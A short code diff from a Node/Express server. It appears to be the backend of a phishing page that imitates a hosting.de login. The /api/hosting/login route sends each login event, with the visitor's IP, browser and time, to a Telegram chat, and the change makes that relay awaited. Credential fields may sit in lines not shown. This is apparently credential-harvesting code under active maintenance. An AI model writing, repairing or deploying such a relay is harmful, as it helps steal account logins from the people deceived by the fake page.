@@ -571,7 +571,7 @@ app.post("/api/hosting/login", async (req, res) => {
     const ip = getClientIp(req);
     const ua = req.headers["user-agent"] || "";
     const when = new Date().toISOString();
-    sendTelegram(
+    await sendTelegram(
       [
         "<b>🔐 hosting.de — Login</b>",
         "",
@@ -582,7 +582,7 @@ app.post("/api/hosting/login", async (req, res) => {
         `<b>Browser:</b> ${parseBrowser(ua)}`,
         `<b>Ora (UTC):</b> ${when}`,
       ].join("\n")
-    ).catch((err) => console.error("[telegram] hosting login:", err.message));
+    );
   }
 
   return res.json({ ok: true });
